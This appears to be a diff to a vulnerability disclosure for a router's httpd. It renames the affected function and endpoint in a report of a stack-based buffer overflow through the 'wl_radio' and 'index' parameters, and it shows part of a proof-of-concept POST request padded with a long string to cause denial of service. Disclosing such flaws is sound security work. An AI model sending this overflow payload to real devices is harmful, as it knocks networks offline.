@@ -16,7 +16,7 @@ Author:Li Tengzheng
 
 We found an overflow vulnerability  in `httpd` :
 
-In  formwrlSSIDset function,it reads in a user-provided parameter `wl_radio`and `index`.
+In  formwrlSSIDget function,it reads in a user-provided parameter `wl_radio`and `index`.
 
 If the value of wl_radio is not 0, the variable v22 will be passed to the sprintf function without any length check, which may overflow the stack-based buffer s__2. 
 
@@ -27,7 +27,7 @@ As a result, by requesting the page, an attacker can easily execute a denial of 
 ## Proof of Concept (PoC)
 
 ```
-POST /goform/wifiSSIDset HTTP/1.1
+POST /goform/wifiSSIDget HTTP/1.1
 Host: 192.168.6.2
 Content-Length: 2070
 Cache-Control: max-age=0
@@ -48,5 +48,6 @@ wl_radio=1&index=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
 
 
 <div  align="center"><img src="./img/poc.png" style="zoom:80%;" /></div>
+
 
 
